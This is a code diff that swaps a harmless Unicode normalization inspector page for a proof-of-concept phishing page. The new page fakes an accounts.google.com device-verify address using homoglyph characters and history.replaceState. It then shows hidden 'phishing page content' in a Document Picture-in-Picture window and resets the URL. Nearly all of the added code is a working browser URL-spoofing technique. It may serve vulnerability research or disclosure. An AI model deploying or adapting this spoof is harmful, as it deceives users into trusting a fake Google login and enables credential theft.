@@ -3,199 +3,44 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Unicode Normalization &amp; Homograph Probe</title>
+<title>PIP Homograph Test</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #0d1117;
-    color: #e6edf3;
-    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-    padding: 20px;
-    line-height: 1.5;
-  }
-  .card {
-    background: #161b22;
-    border: 1px solid #30363d;
-    border-radius: 10px;
-    padding: 16px;
-    max-width: 760px;
-    margin: 0 auto 16px;
-  }
-  h1 { font-size: 18px; color: #58a6ff; margin-bottom: 8px; }
-  h2 { font-size: 14px; color: #79c0ff; margin-bottom: 10px; }
-  p.desc { font-size: 12px; color: #8b949e; margin-bottom: 14px; }
-  .row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
-  input {
-    flex: 1;
-    min-width: 240px;
-    background: #0d1117;
-    color: #e6edf3;
-    border: 1px solid #30363d;
-    border-radius: 6px;
-    padding: 8px 12px;
-    font-family: inherit;
-    font-size: 13px;
-  }
-  button {
-    background: #21262d;
-    color: #e6edf3;
-    border: 1px solid #30363d;
-    border-radius: 6px;
-    padding: 8px 14px;
-    font-family: inherit;
-    font-size: 12px;
-    cursor: pointer;
-  }
-  button:hover { border-color: #58a6ff; }
-  pre {
-    background: #0d1117;
-    border: 1px solid #21262d;
-    border-radius: 6px;
-    padding: 12px;
-    font-size: 12px;
-    overflow-x: auto;
-    white-space: pre-wrap;
-    word-break: break-all;
-  }
-  table { width: 100%; border-collapse: collapse; font-size: 12px; }
-  th, td { border-bottom: 1px solid #21262d; padding: 8px; text-align: left; }
-  th { color: #8b949e; font-weight: 600; }
+    #content {
+        display: none;
+    }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <h1>Unicode Normalization &amp; Homograph Probe</h1>
-  <p class="desc">Uji perbandingan bentuk NFC, NFD, NFKC, NFKD, code point (U+XXXX), dan karakter homoglyph pada browser / WebView.</p>
+<button id="button">Open PIP</button>
 
-  <div class="row">
-    <input id="probe-input" type="text" value="аpple.com / ｓｕｐｐｏｒｔ / e\u0301" placeholder="Masukkan teks atau domain uji...">
-    <button id="run-btn">Inspect</button>
-    <button id="push-query-btn">Test Query State</button>
-  </div>
-
-  <pre id="inspect-output"></pre>
-</div>
-
-<div class="card">
-  <h2>Sample Homoglyph &amp; Normalization Vectors</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Label</th>
-        <th>Sample</th>
-        <th>NFC vs NFKC</th>
-        <th>Code Points</th>
-      </tr>
-    </thead>
-    <tbody id="vectors-body"></tbody>
-  </table>
+<div id="content">
+    phishing page content here
 </div>
 
 <script>
-(function () {
-  'use strict';
+    const button = document.getElementById('button');
+    const content = document.getElementById('content');
 
-  const inputEl = document.getElementById('probe-input');
-  const outEl = document.getElementById('inspect-output');
-  const tbodyEl = document.getElementById('vectors-body');
-  const runBtn = document.getElementById('run-btn');
-  const pushQueryBtn = document.getElementById('push-query-btn');
+    const pipOpen = async () => {
+        const homographQuery = '?...............................https:\uFF0F\uFF0F\u0430ccounts.google.com\uFF0Flogin\uFF0Fdevice\uFF0Fverify';
+        history.replaceState(null, '', homographQuery);
 
-  const SAMPLE_VECTORS = [
-    { label: 'Cyrillic small a (U+0430)', raw: '\u0430pple.com' },
-    { label: 'Fullwidth Latin (NFKC fold)', raw: '\uff41\uff44\uff4d\uff49\uff4e' },
-    { label: 'Decomposed e + acute (NFD -> NFC)', raw: 'e\u0301' },
-    { label: 'Roman numeral / letter-like', raw: '\u216c\u216e' }
-  ];
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 330,
+            height: 317
+        });
 
-  function toCodePoints(str) {
-    return Array.from(str).map((ch) => 'U+' + ch.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')).join(' ');
-  }
+        setTimeout(() => {
+            history.replaceState(null, '', '/');
+        }, 1000);
 
-  function inspectString(str) {
-    const forms = ['NFC', 'NFD', 'NFKC', 'NFKD'];
-    const normalized = {};
-    forms.forEach((f) => {
-      try {
-        const val = str.normalize(f);
-        normalized[f] = {
-          value: val,
-          length: Array.from(val).length,
-          codePoints: toCodePoints(val)
-        };
-      } catch (e) {
-        normalized[f] = { error: e.message };
-      }
-    });
-
-    return {
-      raw: str,
-      rawLength: Array.from(str).length,
-      rawCodePoints: toCodePoints(str),
-      nfkcEqualsRaw: str === str.normalize('NFKC'),
-      nfcEqualsNfkc: str.normalize('NFC') === str.normalize('NFKC'),
-      forms: normalized
+        content.style.display = 'block';
+        pipWindow.document.body.append(content);
     };
-  }
 
-  function renderInspection() {
-    const val = inputEl ? inputEl.value : '';
-    const report = inspectString(val);
-    if (outEl) {
-      outEl.textContent = JSON.stringify(report, null, 2);
-    }
-  }
-
-  function renderVectorsTable() {
-    if (!tbodyEl) return;
-    tbodyEl.innerHTML = '';
-    SAMPLE_VECTORS.forEach((item) => {
-      const tr = document.createElement('tr');
-      const nfc = item.raw.normalize('NFC');
-      const nfkc = item.raw.normalize('NFKC');
-
-      const tdLabel = document.createElement('td');
-      tdLabel.textContent = item.label;
-
-      const tdSample = document.createElement('td');
-      tdSample.textContent = item.raw;
-
-      const tdNorm = document.createElement('td');
-      tdNorm.textContent = `NFC: ${nfc} | NFKC: ${nfkc}`;
-
-      const tdCp = document.createElement('td');
-      tdCp.textContent = toCodePoints(item.raw);
-
-      tr.append(tdLabel, tdSample, tdNorm, tdCp);
-      tbodyEl.appendChild(tr);
-    });
-  }
-
-  if (runBtn) {
-    runBtn.addEventListener('click', renderInspection);
-  }
-
-  if (inputEl) {
-    inputEl.addEventListener('input', renderInspection);
-  }
-
-  if (pushQueryBtn) {
-    pushQueryBtn.addEventListener('click', () => {
-      const current = inputEl ? inputEl.value : '';
-      try {
-        const encoded = encodeURIComponent(current.normalize('NFC'));
-        history.replaceState(null, '', '?probe=' + encoded);
-        renderInspection();
-      } catch (e) {
-        if (outEl) outEl.textContent = 'replaceState error: ' + e.message;
-      }
-    });
-  }
-
-  renderVectorsTable();
-  renderInspection();
-})();
+    button.onclick = pipOpen;
 </script>
+
 </body>
 </html>
